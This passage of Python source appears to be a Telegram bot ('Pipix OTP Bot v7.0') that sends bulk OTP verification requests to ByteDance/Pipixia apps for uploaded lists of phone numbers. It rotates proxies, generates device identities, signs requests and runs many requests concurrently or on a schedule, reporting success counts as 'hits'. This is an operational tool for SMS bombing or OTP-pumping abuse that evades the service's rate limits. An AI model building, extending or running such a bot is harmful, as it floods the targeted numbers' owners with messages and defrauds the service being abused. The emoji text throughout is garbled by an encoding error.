    await update.message.reply_text("âœ… Proxies cleared!", parse_mode="HTML")


async def tasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tasks = task_manager.get_all_tasks()
    
    if not tasks:
        await update.message.reply_text("ðŸ“‹ No tasks.", parse_mode="HTML")
        return
    
    msg = "ðŸ“‹ <b>Tasks:</b>\n\n"
    for task in tasks[-10:]:
        status_emoji = {"pending": "â³", "running": "ðŸ”„", "completed": "âœ…", "cancelled": "âŒ"}.get(task.status, "â“")
        progress = f"{task.current_index}/{len(task.phone_numbers)}"
        elapsed = time.time() - task.start_time
        speed = task.current_index / elapsed if elapsed > 0 else 0
        msg += f"{status_emoji} <b>{task.task_id}</b>\n"
        msg += f"   ðŸ“Š Progress: {progress}\n"
        msg += f"   âœ… {task.success_count} | âŒ {task.fail_count}\n"
        msg += f"   ðŸš€ Speed: {speed:.1f} req/s\n\n"
    
    await update.message.reply_text(msg, parse_mode="HTML")


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.args:
        task_id = context.args[0]
        if await task_manager.cancel_task(task_id):
            await update.message.reply_text(f"âœ… Task {task_id} cancelled.", parse_mode="HTML")
        else:
            await update.message.reply_text(f"âŒ Task {task_id} not found.", parse_mode="HTML")
    else:
        await update.message.reply_text("Usage: /cancel <task_id>", parse_mode="HTML")


async def zijie_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start Super/Pipixia bulk OTP task"""
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "âŒ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    await start_super_bulk_task(update, context, numbers, proxies)


async def zijiesingle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send single Super/Pipixia OTP"""
    user_id = update.effective_user.id
    
    if context.args:
        phone = ' '.join(context.args)
        await process_single_super_otp(update, context, phone)
    else:
        user_states[user_id]['awaiting'] = 'super_single_phone'
        await update.message.reply_text(
            "ðŸš€ <b>Super/Pipixia Single OTP</b>\n\n"
            "Usage: <code>/zijiesingle +937xxxxxxxx</code>\n"
            "Or: <code>/zijiesingle +937xxxxxxxx proxy:port</code>\n\n"
            "Type 3536 - Afghanistan numbers supported!",
            parse_mode="HTML"
        )


async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting == 'numbers':
        numbers = user_states[user_id].get('numbers_buffer', [])
        user_states[user_id]['numbers'] = numbers
        user_states[user_id]['awaiting'] = None
        user_states[user_id]['numbers_buffer'] = []
        await update.message.reply_text(f"âœ… <b>{len(numbers):,} numbers saved!</b>", parse_mode="HTML")
    
    elif awaiting == 'proxies':
        proxies = user_states[user_id].get('proxies_buffer', [])
        user_states[user_id]['proxies'] = proxies
        user_states[user_id]['awaiting'] = None
        user_states[user_id]['proxies_buffer'] = []
        await update.message.reply_text(f"âœ… <b>{len(proxies):,} proxies saved!</b>", parse_mode="HTML")
    
    else:
        await update.message.reply_text("â“ Nothing to finish.", parse_mode="HTML")


# ============================================
# CALLBACK HANDLERS
# ============================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if data == "bulk":
        user_id = query.from_user.id
        numbers = user_states[user_id].get('numbers', [])
        if not numbers:
            await query.edit_message_text(
                "âŒ <b>No numbers loaded!</b>\n\n"
                "Use /setnumbers or /uploadnumbers first.",
                parse_mode="HTML"
            )
        else:
            proxies = user_states[user_id].get('proxies', [])
            await query.edit_message_text(f"ðŸš€ Starting bulk task with {len(numbers):,} numbers...", parse_mode="HTML")
            await start_bulk_task_from_callback(context, query, numbers, proxies)
    
    elif data == "single":
        await query.edit_message_text(
            "ðŸ“± <b>Single OTP</b>\n\n"
            "Send: <code>/single +923099003842</code>",
            parse_mode="HTML"
        )
    
    elif data == "upload_numbers":
        user_id = query.from_user.id
        user_states[user_id]['awaiting'] = 'file_numbers'
        await query.edit_message_text(
            "ðŸ“ <b>Upload Numbers File</b>\n\n"
            "Send a TXT or CSV file.",
            parse_mode="HTML"
        )
    
    elif data == "upload_proxies":
        user_id = query.from_user.id
        user_states[user_id]['awaiting'] = 'file_proxies'
        await query.edit_message_text(
            "ðŸ“ <b>Upload Proxies File</b>\n\n"
            "Send a TXT file with proxies.",
            parse_mode="HTML"
        )
    
    elif data == "schedule":
        await query.edit_message_text(
            "â° <b>Schedule Task</b>\n\n"
            "Use: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code>\n\n"
            "Time is in Pakistan timezone (PKT)",
            parse_mode="HTML"
        )
    
    elif data == "scheduled_list":
        scheduled_tasks = task_manager.get_all_scheduled_tasks()
        pending = [s for s in scheduled_tasks if s.status == "pending"]
        
        if not pending:
            await query.edit_message_text("ðŸ“‹ No scheduled tasks.", parse_mode="HTML")
        else:
            msg = "â° <b>Scheduled Tasks:</b>\n\n"
            for task in pending[-5:]:
                msg += f"ðŸ†” {task.schedule_id}\n"
                msg += f"   ðŸ“± Numbers: {len(task.phone_numbers):,}\n"
                msg += f"   ðŸ• Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
            await query.edit_message_text(msg, parse_mode="HTML")
    
    elif data == "status":
        stats = identity_generator.get_stats()
        running = task_manager.get_running_count()
        pk_time = get_pakistan_time().strftime("%I:%M:%S %p")
        g_stats = global_stats.get_stats()
        
        await query.edit_message_text(
            f"ðŸ“Š <b>Status</b>\n\n"
            f"ðŸ¤– Bot: Online âœ…\n"
            f"ðŸ“¦ SignerPy: {'âœ…' if SIGNERPY_AVAILABLE else 'âŒ'}\n"
            f"ðŸ• Time: {pk_time}\n"
            f"ðŸ“‹ Running: {running}\n"
            f"ðŸ”¢ IDs Generated: {stats['total_generated']:,}\n\n"
            f"ðŸ“ˆ <b>Global:</b>\n"
            f"â€¢ Requests: {g_stats['total_requests']:,}\n"
            f"â€¢ Success: {g_stats['total_success']:,}\n"
            f"â€¢ Failed: {g_stats['total_failed']:,}",
            parse_mode="HTML"
        )
    
    elif data == "tasks":
        tasks = task_manager.get_all_tasks()
        if not tasks:
            await query.edit_message_text("ðŸ“‹ No tasks.", parse_mode="HTML")
        else:
            msg = "ðŸ“‹ <b>Tasks:</b>\n\n"
            for task in tasks[-5:]:
                status_emoji = {"pending": "â³", "running": "ðŸ”„", "completed": "âœ…", "cancelled": "âŒ"}.get(task.status, "â“")
                msg += f"{status_emoji} {task.task_id}: {task.current_index}/{len(task.phone_numbers)}\n"
            await query.edit_message_text(msg, parse_mode="HTML")
    
    elif data == "global_stats":
        g_stats = global_stats.get_stats()
        uptime_mins = g_stats['uptime_seconds'] / 60
        success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
        
        await query.edit_message_text(
            f"ðŸ“ˆ <b>Global Statistics</b>\n\n"
            f"ðŸ”¢ Total Requests: {g_stats['total_requests']:,}\n"
            f"âœ… Success: {g_stats['total_success']:,}\n"
            f"âŒ Failed: {g_stats['total_failed']:,}\n"
            f"ðŸ“Š Success Rate: {success_rate:.1f}%\n\n"
            f"â± Uptime: {uptime_mins:.1f} min\n"
            f"ðŸš€ Req/Min: {g_stats['requests_per_minute']:.1f}",
            parse_mode="HTML"
        )


# ============================================
# OTP PROCESSING - ULTRA FAST
# ============================================

async def process_single_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    user_id = update.effective_user.id
    proxies = user_states[user_id].get('proxies', [])
    
    # Parse proxy from command if provided
    parts = phone.split()
    phone_num = parts[0]
    proxy = parts[1] if len(parts) > 1 else None
    
    if not proxy and proxies:
        proxy = random.choice(proxies)
    
    # Use thread pool for blocking operation with user's selected app
    app_key = user_states[user_id].get('app', DEFAULT_APP)
    loop = asyncio.get_event_loop()
    sender = ByteDanceOTPSender(identity_generator, app_key)
    result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
    
    await global_stats.increment(result.get("success", False))
    
    if result.get("success"):
        status = "âœ… SUCCESS"
        status_detail = result.get("message", "OTP Sent")
    else:
        status = "âŒ FAILED"
        error = result.get("data", {}).get("description", result.get("error", "Unknown")) if isinstance(result.get("data"), dict) else result.get("error", "Unknown")
        status_detail = str(error)[:100]
    
    time_ms = result.get("time_ms", 0)
    
    msg = f"""
{'âœ…' if result.get('success') else 'âŒ'} <b>OTP Result</b>

ðŸ“± Phone: <code>{phone_num}</code>
ðŸŒ Proxy: {(proxy or 'Direct')[:30]}
ðŸ“Š Status: {status_detail}
â± Time: {time_ms:.2f}ms
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def start_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, numbers: List[str], proxies: List[str]):
    chat_id = str(update.effective_chat.id)
    user_id = update.effective_user.id
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.app_key = user_states[user_id].get('app', DEFAULT_APP)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await update.message.reply_text(
        f"ðŸš€ <b>Task #{task_id} Started!</b>\n\n"
        f"ðŸ“± Numbers: {len(numbers):,}\n"
        f"ðŸ”’ Proxies: {len(proxies):,}\n"
        f"âš¡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
        f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    # Run in background - non-blocking
    asyncio.create_task(run_bulk_task_concurrent(context, task))


async def start_bulk_task_from_callback(context: ContextTypes.DEFAULT_TYPE, query, numbers: List[str], proxies: List[str]):
    chat_id = str(query.message.chat_id)
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"ðŸš€ <b>Task #{task_id} Started!</b>\n\n"
             f"ðŸ“± Numbers: {len(numbers):,}\n"
             f"ðŸ”’ Proxies: {len(proxies):,}\n"
             f"âš¡ Concurrent: {MAX_CONCURRENT_OTP}\n\n"
             f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    asyncio.create_task(run_bulk_task_concurrent(context, task))


async def run_scheduled_task(context: ContextTypes.DEFAULT_TYPE, schedule_id: str):
    """Run a scheduled task at the specified time"""
    scheduled_task = task_manager.get_scheduled_task(schedule_id)
    if not scheduled_task:
        return
    
    # Wait until scheduled time
    now = get_pakistan_time()
    wait_seconds = (scheduled_task.scheduled_time - now).total_seconds()
    
    if wait_seconds > 0:
        await asyncio.sleep(wait_seconds)
    
    # Check if cancelled
    if scheduled_task.status == "cancelled":
        return
    
    scheduled_task.status = "running"
    
    # Create and run the task
    task_id = await task_manager.create_task(
        scheduled_task.phone_numbers,
        scheduled_task.proxies,
        scheduled_task.chat_id
    )
    task = task_manager.get_task(task_id)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await context.bot.send_message(
        chat_id=scheduled_task.chat_id,
        text=f"â° <b>Scheduled Task Starting!</b>\n\n"
             f"ðŸ†” Schedule: {schedule_id}\n"
             f"ðŸ†” Task: {task_id}\n"
             f"ðŸ“± Numbers: {len(scheduled_task.phone_numbers):,}\n"
             f"ðŸ”’ Proxies: {len(scheduled_task.proxies):,}",
        parse_mode="HTML"
    )
    
    await run_bulk_task_concurrent(context, task)
    scheduled_task.status = "completed"


async def run_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
    """Run bulk task with TRUE CONCURRENCY - 5-10 requests at once"""
    
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_OTP)
    batch_results = []
    last_log_count = 0
    
    # Process in batches for better control
    for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
        if task.cancelled:
            break
        
        batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
        batch = task.phone_numbers[batch_start:batch_end]
        
        # Create concurrent tasks for this batch
        tasks = [
            send_otp_async(phone, task.proxies, semaphore, task.app_key)
            for phone in batch
        ]
        
        # Execute all concurrently
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in results:
            if isinstance(result, Exception):
                task.fail_count += 1
                batch_results.append({"success": False, "error": str(result)})
            else:
                if result.get("success"):
                    task.success_count += 1
                else:
                    task.fail_count += 1
                batch_results.append(result)
            
            task.current_index += 1
        
        # Log every LOG_INTERVAL requests
        if task.current_index - last_log_count >= LOG_INTERVAL:
            last_log_count = task.current_index
            elapsed = time.time() - task.start_time
            speed = task.current_index / elapsed if elapsed > 0 else 0
            
            # Get last few results for log
            recent_results = batch_results[-LOG_INTERVAL:]
            recent_success = sum(1 for r in recent_results if r.get("success"))
            recent_failed = len(recent_results) - recent_success
            
            # Global stats
            g_stats = global_stats.get_stats()
            
            progress_msg = f"""
ðŸ“Š <b>Task #{task.task_id} Progress</b>

ðŸ“ˆ Progress: {task.current_index}/{len(task.phone_numbers)}
âœ… Total Success: {task.success_count}
âŒ Total Failed: {task.fail_count}

ðŸ“‹ <b>Last {len(recent_results)} Requests:</b>
âœ… Success: {recent_success} | âŒ Failed: {recent_failed}

ðŸš€ Speed: {speed:.1f} req/s
â± Elapsed: {elapsed:.1f}s

ðŸ“ˆ <b>Global Hits:</b>
â€¢ Total: {g_stats['total_requests']:,}
â€¢ Success: {g_stats['total_success']:,}
â€¢ Failed: {g_stats['total_failed']:,}
"""
            await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")
    
    task.status = "completed" if not task.cancelled else "cancelled"
    task_manager.running_tasks.discard(task.task_id)
    
    # Final message
    elapsed = time.time() - task.start_time
    rate = (task.success_count / len(task.phone_numbers) * 100) if task.phone_numbers else 0
    speed = len(task.phone_numbers) / elapsed if elapsed > 0 else 0
    g_stats = global_stats.get_stats()
    
    final_msg = f"""
ðŸ <b>Task #{task.task_id} Complete!</b>

ðŸ“Š Total: {len(task.phone_numbers)}
âœ… Success: {task.success_count}
âŒ Failed: {task.fail_count}
ðŸ“ˆ Success Rate: {rate:.1f}%

â± Total Time: {elapsed:.1f}s
ðŸš€ Average Speed: {speed:.1f} req/s

ðŸ“ˆ <b>Global Hits:</b>
â€¢ Total Requests: {g_stats['total_requests']:,}
â€¢ Total Success: {g_stats['total_success']:,}
â€¢ Total Failed: {g_stats['total_failed']:,}
"""
    await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")


# ============================================
# SUPER OTP PROCESSING FUNCTIONS
# ============================================

async def process_single_super_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    """Process single Super/Pipixia OTP"""
    user_id = update.effective_user.id
    proxies = user_states[user_id].get('proxies', [])
    
    parts = phone.split()
    phone_num = parts[0]
    proxy = parts[1] if len(parts) > 1 else None
    
    if not proxy and proxies:
        proxy = random.choice(proxies)
    
    loop = asyncio.get_event_loop()
    sender = SuperOTPSender(identity_generator)
    result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
    
    await global_stats.increment(result.get("success", False))
    
    if result.get("success"):
        status = "SUCCESS"
        status_detail = "OTP Sent (Type 3536 - Afghanistan)"
    else:
        status = "FAILED"
        error_code = result.get("data", {}).get("error_code")
        error_desc = result.get("data", {}).get("description", "Unknown")
        status_detail = f"Error {error_code}: {error_desc}" if error_code else str(result.get("error", "Unknown"))
    
    time_ms = result.get("time_ms", 0)
    
    msg = f"""
{'SUCCESS' if result.get('success') else 'FAILED'} <b>Super/Pipixia OTP Result</b>

Phone: <code>{phone_num}</code>
Proxy: {(proxy or 'Direct')[:30]}
Status: {status_detail}
Time: {time_ms:.2f}ms
Device: {result.get('device_id', 'N/A')[:16]}...
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def start_super_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE, numbers: List[str], proxies: List[str]):
    """Start Super/Pipixia bulk OTP task"""
    chat_id = str(update.effective_chat.id)
    task_id = await task_manager.create_task(numbers, proxies, chat_id)
    task = task_manager.get_task(task_id)
    task.status = "running"
    task_manager.running_tasks.add(task_id)
    
    await update.message.reply_text(
        f"<b>Super/Pipixia Task #{task_id} Started!</b>\n\n"
        f"Numbers: {len(numbers):,}\n"
        f"Proxies: {len(proxies):,}\n"
        f"Type: 3536 (Afghanistan)\n"
        f"Delay: 3s between requests\n\n"
        f"Use /cancel {task_id} to stop.",
        parse_mode="HTML"
    )
    
    asyncio.create_task(run_super_bulk_task_concurrent(context, task))


async def run_super_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
    """Run Super/Pipixia bulk task with rate limiting"""
    
    semaphore = asyncio.Semaphore(5)  # Lower concurrency for Super
    batch_results = []
    last_log_count = 0
    
    for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
        if task.cancelled:
            break
        
        batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
        batch = task.phone_numbers[batch_start:batch_end]
        
        tasks = [
            send_super_otp_async(phone, task.proxies, semaphore)
            for phone in batch
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, Exception):
                task.fail_count += 1
                batch_results.append({"success": False, "error": str(result)})
            else:
                if result.get("success"):
                    task.success_count += 1
                else:
                    task.fail_count += 1
                batch_results.append(result)
            
            task.current_index += 1
        
        if task.current_index - last_log_count >= LOG_INTERVAL:
            last_log_count = task.current_index
            elapsed = time.time() - task.start_time
            speed = task.current_index / elapsed if elapsed > 0 else 0
            
            recent_results = batch_results[-LOG_INTERVAL:]
            recent_success = sum(1 for r in recent_results if r.get("success"))
            recent_failed = len(recent_results) - recent_success
            
            g_stats = global_stats.get_stats()
            
            progress_msg = f"""
<b>Super Task #{task.task_id} Progress</b>

Progress: {task.current_index}/{len(task.phone_numbers)}
Success: {task.success_count}
Failed: {task.fail_count}

Last {len(recent_results)} Requests:
Success: {recent_success} | Failed: {recent_failed}

Speed: {speed:.1f} req/s
Elapsed: {elapsed:.1f}s

Global Hits:
Total: {g_stats['total_requests']:,}
Success: {g_stats['total_success']:,}
Failed: {g_stats['total_failed']:,}
"""
            await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")
    
    task.status = "completed" if not task.cancelled else "cancelled"
    task_manager.running_tasks.discard(task.task_id)
    
    elapsed = time.time() - task.start_time
    rate = (task.success_count / len(task.phone_numbers) * 100) if task.phone_numbers else 0
    speed = len(task.phone_numbers) / elapsed if elapsed > 0 else 0
    g_stats = global_stats.get_stats()
    
    final_msg = f"""
<b>Super Task #{task.task_id} Complete!</b>

Total: {len(task.phone_numbers)}
Success: {task.success_count}
Failed: {task.fail_count}
Success Rate: {rate:.1f}%

Total Time: {elapsed:.1f}s
Average Speed: {speed:.1f} req/s

Global Hits:
Total Requests: {g_stats['total_requests']:,}
Total Success: {g_stats['total_success']:,}
Total Failed: {g_stats['total_failed']:,}
"""
    await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")


# ============================================
# MESSAGE & FILE HANDLERS
# ============================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if not text:
        return
    
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting == 'numbers':
        new_numbers = parse_phone_numbers(text)
        if 'numbers_buffer' not in user_states[user_id]:
            user_states[user_id]['numbers_buffer'] = []
        user_states[user_id]['numbers_buffer'].extend(new_numbers)
        count = len(user_states[user_id]['numbers_buffer'])
        await update.message.reply_text(f"ðŸ“¥ +{len(new_numbers):,} numbers (Total: {count:,})\nSend more or /done", parse_mode="HTML")
    
    elif awaiting == 'proxies':
        new_proxies = parse_proxies(text)
        if 'proxies_buffer' not in user_states[user_id]:
            user_states[user_id]['proxies_buffer'] = []
        user_states[user_id]['proxies_buffer'].extend(new_proxies)
        count = len(user_states[user_id]['proxies_buffer'])
        await update.message.reply_text(f"ðŸ“¥ +{len(new_proxies):,} proxies (Total: {count:,})\nSend more or /done", parse_mode="HTML")
    
    elif awaiting == 'single_phone':
        user_states[user_id]['awaiting'] = None
        await process_single_otp(update, context, text.strip())
    
    else:
        # Check if it's a phone number
        text_clean = text.strip()
        if text_clean.startswith('+') or (len(text_clean) >= 10 and text_clean[0].isdigit()):
            await process_single_otp(update, context, text_clean)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    awaiting = user_states[user_id].get('awaiting')
    
    if awaiting not in ['file_numbers', 'file_proxies']:
        return
    
    document = update.message.document
    file_name = document.file_name.lower()
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    file_bytes = await file.download_as_bytearray()
    content = file_bytes.decode('utf-8', errors='ignore')
    
    if awaiting == 'file_numbers':
        numbers = parse_phone_numbers(content)
        numbers = list(set(numbers))
        user_states[user_id]['numbers'] = numbers
        user_states[user_id]['awaiting'] = None
        
        await update.message.reply_text(
            f"âœ… <b>Numbers Loaded!</b>\n\n"
            f"ðŸ“Š Extracted: {len(numbers):,} unique numbers\n"
            f"ðŸ“ File: {document.file_name}",
            parse_mode="HTML"
        )
    
    elif awaiting == 'file_proxies':
        proxies = parse_proxies(content)
        user_states[user_id]['proxies'] = proxies
        user_states[user_id]['awaiting'] = None
        
        await update.message.reply_text(
            f"âœ… <b>Proxies Loaded!</b>\n\n"
            f"ðŸ“Š Loaded: {len(proxies):,} proxies\n"
            f"ðŸ“ File: {document.file_name}",
            parse_mode="HTML"
        )


# ============================================
# MAIN
# ============================================

def main():
    if not SIGNERPY_AVAILABLE:
        logger.error("SignerPy not available! Bot may not work correctly.")
    
    # Build application with high concurrency settings
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .connection_pool_size(100)
        .pool_timeout(30.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )
    
    # Command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("single", single_command))
    application.add_handler(CommandHandler("bulk", bulk_command))
    application.add_handler(CommandHandler("schedule", schedule_command))
    application.add_handler(CommandHandler("scheduled", scheduled_command))
    application.add_handler(CommandHandler("cancelschedule", cancelschedule_command))
    application.add_handler(CommandHandler("setnumbers", setnumbers_command))
    application.add_handler(CommandHandler("setproxies", setproxies_command))
    application.add_handler(CommandHandler("uploadnumbers", uploadnumbers_command))
    application.add_handler(CommandHandler("uploadproxies", uploadproxies_command))
    application.add_handler(CommandHandler("clearnumbers", clearnumbers_command))
    application.add_handler(CommandHandler("clearproxies", clearproxies_command))
    application.add_handler(CommandHandler("tasks", tasks_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("apps", apps_command))
    application.add_handler(CommandHandler("setapp", setapp_command))
    application.add_handler(CommandHandler("zijie", zijie_command))
    application.add_handler(CommandHandler("zijiesingle", zijiesingle_command))
    application.add_handler(CommandHandler("done", done_command))
    
    # Callback handler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logger.info("ðŸš€ Pipix OTP Bot v7.0 starting...")
    logger.info(f"âš¡ Max Concurrent OTP: {MAX_CONCURRENT_OTP}")
    logger.info(f"ðŸ“Š Log Interval: Every {LOG_INTERVAL} requests")
    logger.info(f"â° Schedule Feature: Enabled")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
